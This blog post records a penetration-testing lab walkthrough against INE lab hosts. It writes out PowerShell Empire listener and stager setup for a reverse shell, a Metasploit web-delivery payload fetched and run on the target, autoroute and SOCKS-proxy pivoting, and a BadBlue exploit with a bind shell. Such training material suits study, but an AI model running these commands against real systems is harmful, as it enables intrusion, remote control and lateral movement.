---
layout: post
title: "Leveraging PowerShell During Exploitation"
date: "2024-06-12"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Professional
    - Resource Development & Initial Access
    - PowerShell for Pentesters
---

# Leveraging PowerShell During Exploitation
# Lab Demo: Leveraging PowerShell During Exploitation
[Empire Quickstart](https://bc-security.gitbook.io/empire-wiki/quickstart)

```
cat /etc/hosts

10.4.22.227 demo.ine.local
10.4.22.232 fileServer.ine.local
```

```
ping demo.ine.local
```

```
ping fileServer.ine.local
```

```
nmap demo.ine.local
nmap -p- demo.ine.local
```

Open up a browser

```
demo.ine.local:4983
```

It also displays the admin credentials for this particular host.

```
/user:Administrator abc_123321!@#
```

```
smbexec.py 'Administrator:abc_123321!@#'@demo.ine.local
```

```
whoami
```

```
ipconfig

IPv4 Address 10.4.22.227
Subnet Mask 255.255.240.0
Default Gateway 10.4.16.1
```

```
ping 10.4.22.232
```

PowerShell Empire

Shell No. 2

```
powershell-empire server
```

Shell No. 3

```
powershell-empire client
```

Establish a session on demo.ine.local. And use a PowerShell Empire Stager to get that a reverse shell session.

Set up a listener.

```
uselistener http
```

Shell No. 4

```
ifconfig

10.10.22.3
```

Kali Linux: 10.10.22.3

```
set Host 10.10.22.3
set Port 8888
execute
listener
main
```

Set up our Stager, which is our payload.

```
usestager multi/launcher
```

Set the Listener option to the listener we created.

```
set Listener http
execute
```

This will generate the PowerShell code that is obfuscated that we then need to run on the target system that we want to get a session on.

We already have a session on the target system via smbexec.

Go back to our smbexec session.

Shell No. 1

Shell No. 3

```
agents
interact 687BVLWR
```

Perform local enumeration, or situational_awareness

```
usemodule powershell/situational_awareness/host/computerdetails
execute
```

```
usemodule powershell/situational_awareness/network/portscan
set Hosts 10.4.22.232
execute
```

Pivot to this system. Port forwarding techniques.

Shell No. 4

```
msfconsole
```

Utilize a web delivery payload to get a meterpreter session on demo.ine.local first, and then perform a network route so that we can access the internal network that demo.ine.local is a part of. And that fileServer.ine.local is a part of so that we can interact with that service running on port 80.

```
search web_delivery
use 1
show options
set target 2
show options
```

Shell No. 5

```
ifconfig

10.10.22.3
```

Shell No. 4

```
set SRVHOST 10.10.22.3
set LHOST 10.10.22.3
set payload windows/meterpreter/reverse_tcp
exploit
```

It's going to give us a URL where that particular payload is hosted. Copy that link.

Going into our Empire session.

Shell No. 3

```
usemodule powershell/code_execution/invoke_metasploitpayload
set URL
execute
```

Shell No. 4

```
sessions
```

We get a meterpreter session on demo.ine.local.

We can use some port forwarding automation modules.

```
sessions 1
sysinfo
getuid
```

Put this session in the background.

```
search autoroute
use 0
set SESSION 1
run
```

We can perform port forwarding for port 80 that's running on the fileServer.ine.local onto our Kali Linux system.

```
use auxiliary/server/socks_proxy
```

[SOCKS Proxy Server](https://www.rapid7.com/db/modules/auxiliary/server/socks_proxy/)

This module provides a SOCKS proxy server that uses the builtin Metasploit routing to relay connections.

We can access that web server within our own browser.

Metasploit的SOCKS Proxy Server是一个内置的代理服务器模块，允许你通过Metasploit会话来路由网络流量。这个功能尤其对于进行渗透测试和网络安全研究非常有用，因为它可以帮助你掩盖真实IP地址，通过受控的系统转发流量，从而安全地访问目标网络中的资源。

主要特点
1. **隐蔽性**：通过在受控主机上设置SOCKS代理，攻击者可以将自己的网络活动伪装成来自受控主机的正常流量。
2. **灵活性**：支持任何能够配置SOCKS代理的应用程序，如浏览器、FTP客户端等。
3. **集成性**：紧密集成于Metasploit框架中，可以与其他模块和功能配合使用，例如Meterpreter会话。

使用场景
- **跨越网络隔离**：例如，在一个拥有多层网络防护的企业环境中，一旦入侵者通过某个漏洞获得了内网某台机器的控制权，便可以在该机器上部署SOCKS代理，通过这台机器访问其他内网资源。
- **绕过IP白名单或防火墙规则**：某些网络只允许特定IP地址访问特定服务。通过在这些网络中的受控机器上设置SOCKS代理，攻击者可以伪装成合法的IP地址。

配置方法
在Metasploit中使用SOCKS Proxy Server通常涉及以下步骤：
1. **启动Meterpreter会话**：首先需要在目标机器上获得Meterpreter会话。
2. **加载SOCKS代理模块**：使用`use auxiliary/server/socks_proxy`命令加载SOCKS代理模块。
3. **配置并启动代理**：设置代理的端口和其他参数（如认证信息），然后启动代理服务。

使用SOCKS代理时应当注意的是，所有通过代理的流量都会通过控制的Meterpreter会话传输，这可能导致流量增加和性能下降。同时，也要注意避免在不合法的情境中使用此类工具，以免违反法律法规。

```
show options
set SRVHOST 10.10.22.3 # Kali Linux system
run
```

Open up Firefox

Settings->proxy->Manual proxy configuration->SOCKS Host

```
Host: 10.10.22.3 # Kali Linux Port: 1080
```

Shell No. 4

```
fileserver.ine.local
```

```
search badblue
use 1
set RHOSTS fileserver.ine.local
```

It will automatically route it, because we can now access it or interact with it via the socks proxy.

[SOCKS proxy](https://www.thehacker.recipes/infra/pivoting/socks-proxy)

However, because we are performing lateral movement through port forwarding, instead of a reverse connection, we wanted to bind to that particular port. So bind TCP or to a port on the target system. And we want that system to connect back to us.

```
set PAYLOAD windows/meterpreter/bind_tcp
exploit
sysinfo
getuid
```

Put the session in the background.

```
sessions
```